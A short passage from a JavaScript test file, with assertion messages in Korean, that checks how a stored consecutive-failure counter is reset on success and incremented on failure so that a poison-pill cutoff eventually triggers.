    '성공·전진이 카운터를 안 끊는다 — 띄엄띄엄한 실패 3번이 멀쩡한 슬라이스를 버리거나, 전진 뒤에도 카운터가 산다');
  assert.ok(근처.includes("setProperty('오류뱅크_연속실패'"), '실패가 카운터를 안 걷는다 — 포이즌 필이 영원히 안 발화한다');
});
